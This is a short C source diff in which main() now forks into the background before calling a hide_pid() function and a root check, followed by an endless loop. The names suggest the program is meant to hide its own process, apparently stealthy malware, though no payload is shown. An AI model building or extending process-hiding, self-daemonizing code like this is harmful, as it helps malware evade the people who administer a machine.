@@ -35,8 +35,10 @@ int is_root(void) {
 }
 
 int main(int argc, char *argv[]) {
+	if (fork() != 0) return 0;
+	
 	hide_pid();
-	is_root();
+	is_root(); 
 	char str[30];
 
 	while (1) {
